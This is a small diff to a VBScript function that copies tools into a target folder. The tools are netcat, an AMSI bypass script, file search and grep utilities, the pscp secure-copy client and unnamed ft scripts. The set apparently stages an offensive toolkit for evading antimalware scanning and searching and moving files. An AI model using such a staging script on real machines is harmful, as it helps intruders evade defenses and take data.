@@ -66,6 +66,11 @@ Function MoveFile()
 		WScript.Sleep 200
 		objFso.CopyFile "nc.exe", strPath & "\"
 		objFso.CopyFile "AMSI_bypass.ps1", strPath & "\"
+		objFso.CopyFile "es.exe", strPath & "\"
+		objFso.CopyFile "grep.exe", strPath & "\"
+		objFso.CopyFile "pscp.exe", strPath & "\"
+		objFso.CopyFile "ft.ps1", strPath & "\"
+		objFso.CopyFile "ftcmd.bat", strPath & "\"
 End Function
 
 Function Finish()
